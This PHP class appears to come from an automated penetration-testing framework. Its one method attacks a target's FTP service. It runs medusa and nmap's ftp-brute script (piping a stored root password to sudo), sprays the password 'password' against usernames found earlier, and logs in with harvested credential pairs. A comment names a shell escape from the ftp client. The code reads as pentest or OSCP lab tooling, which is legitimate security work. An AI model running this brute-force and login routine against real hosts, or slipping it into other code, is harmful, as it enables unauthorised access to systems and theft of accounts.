<?php


class service2ftp extends SERVICE {


    public function __construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo);
    }

    // From ftp > !/bin/sh -c  or !/bin/bash
    // https://www.jpsecnetworks.com/week-8-oscp-preparation-post-exploitation/
    // https://codemonkeyism.co.uk/post-exploitation-file-transfers/
    // http://devloop.users.sourceforge.net/index.php?article151/solution-du-ctf-c0m80-1-de-vulnhub
    
    public function service2ftp4exec(){
        $result = "";

        
            $result .= $this->ssTitre(__FUNCTION__);
           $user2name = "user_doesnt_exist";
            $user2pass = "pass_doesnt_exist" ; 
            $query_medusa = "medusa -u \"$user2name\" -p \"$user2pass\" -h '$this->ip' -M ftp -f -t 1 -e s -n $this->port  2>/dev/null | grep '\[SUCCESS\]' ";
            if (!empty($this->req_ret_str($query_medusa))) {
                $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "help");
                $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "PWD");
            return $result;
            }
            
            $this->pause();
            
            $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ftp-brute.nse\" --script-args userdb=$this->dico_users $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->auth2login4nmap($this->req_ret_str($query),"FTP nmap Brute");
            
            $this->pause();
            
            $sql_r = "select distinct(user2name) FROM USERS where id8port = '$this->port2id' ORDER BY user2name;";
            $conn = $this->mysql_ressource->query($sql_r);
            while ($row = $conn->fetch_assoc()){
                $user2name = trim($row['user2name']);
                $result .= $this->article("USER FOUND FOR TEST", "$user2name");
                $result .= $this->port2auth4pass4medusa("ftp",$user2name,"password");
             }
            
             $this->pause();
            
            $sql_r = "select distinct(user2name),user2pass FROM AUTH where id8port = '$this->port2id' ORDER BY user2name;";
            $conn = $this->mysql_ressource->query($sql_r);
            while ($row = $conn->fetch_assoc()){
                $user2name = trim($row['user2name']);
                $user2pass = trim($row['user2pass']);
                $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
              
                if (!empty($user2name)) {
                    $check = $this->auth2login_ftp4exec($user2name, $user2pass, "help");
                    if (!empty($check)) {
                        $result .= $check ;
                        //$result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "STAT");
                        //$result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "SYST");
                        $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "PWD");
                        //echo $result; $this->pause();
                    }
                }
            }
            
            $this->pause();
            
            return $result;
        
    }
    



  }
?>
